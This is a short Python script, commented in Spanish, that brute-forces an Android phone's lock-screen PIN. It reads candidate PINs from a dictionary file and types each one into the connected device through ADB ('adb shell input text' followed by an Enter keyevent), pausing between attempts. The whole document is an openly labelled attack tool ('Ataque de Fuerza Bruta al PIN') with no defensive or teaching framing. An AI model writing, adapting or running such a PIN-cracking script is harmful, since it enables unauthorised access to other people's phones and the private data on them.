import os
import time

# Ruta del diccionario de PINs
diccionario_pins = "diccionario_pins_1"

# Verificar si ADB detecta el celular
def verificar_adb():
    dispositivos = os.popen("adb devices").read()
    if "device" in dispositivos and "unauthorized" not in dispositivos:
        print("[✅] Dispositivo detectado correctamente.")
        return True
    else:
        print("[⚠️] No se detecta un dispositivo ADB. Revisa la conexión USB y acepta la depuración.")
        return False

# Función para probar los PINs
def ataque_fuerza_bruta():
    if not verificar_adb():
        return
    
    if not os.path.exists(diccionario_pins):
        print("[❌] Archivo de diccionario no encontrado.")
        return

    with open(diccionario_pins, "r") as file:
        for pin in file:
            pin = pin.strip()
            if pin:
                print(f"🔍 Probando PIN: {pin}")
                
                # Enviar el PIN al celular
                os.system(f"adb shell input text {pin}")
                time.sleep(0.5)  # Espera medio segundo

                # Presionar Enter para confirmar
                os.system("adb shell input keyevent 66")
                time.sleep(2)  # Espera antes del siguiente intento

                # Opción para detener el ataque manualmente
                detener = input("[⏹] Presiona ENTER para continuar o escribe 'salir' para detener: ")
                if detener.lower() == "salir":
                    print("[🛑] Ataque detenido por el usuario.")
                    break

if __name__ == "__main__":
    print("🔥 Ataque de Fuerza Bruta al PIN 🔥")
    ataque_fuerza_bruta()
